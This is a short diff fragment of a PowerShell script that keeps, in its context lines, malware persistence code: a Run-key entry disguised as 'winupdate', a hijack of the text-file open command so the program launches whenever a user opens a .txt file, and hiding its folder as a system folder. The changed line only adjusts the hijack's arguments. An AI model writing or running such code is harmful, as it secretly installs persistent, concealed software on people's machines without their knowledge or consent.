@@ -29,7 +29,7 @@ $strFilePath = $strFileName.FullName
 New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
 
 # make program open anytime a user opens a text file
-New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$strFilePath %1" -Force
+New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$strFilePath -o %1" -Force
 
 # make folder hidden
 $(Get-Item $WINDIR\$strFileDir).Attributes = ‘Hidden, System’
